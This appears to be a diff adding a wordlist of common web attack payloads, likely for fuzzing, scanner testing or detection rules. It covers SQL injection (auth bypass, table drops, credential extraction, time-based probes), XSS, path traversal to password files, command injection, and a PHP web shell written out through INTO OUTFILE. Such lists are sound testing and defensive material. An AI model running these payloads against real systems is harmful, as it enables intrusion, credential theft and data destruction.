@@ -1,0 +1,30 @@
+' OR '1'='1
+' OR '1'='1' --
+admin'--
+1' OR '1' = '1
+' OR 1=1--
+'; DROP TABLE users;--
+1; DROP TABLE users
+UNION SELECT null,null,null--
+' UNION SELECT username,password FROM users--
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+javascript:alert(document.cookie)
+../../../etc/passwd
+../../../../etc/shadow
+/etc/passwd
+cmd.exe /c dir
+; ls -la
+| cat /etc/passwd
+`whoami`
+$(whoami)
+<?php system($_GET['cmd']); ?>
+eval(base64_decode(
+SELECT * FROM users WHERE 1=1
+AND SLEEP(5)
+BENCHMARK(1000000,MD5(1))
+WAITFOR DELAY '0:0:5'
+' AND 1=CONVERT(int,@@version)--
+xp_cmdshell('dir')
+LOAD_FILE('/etc/passwd')
+INTO OUTFILE '/var/www/shell.php'
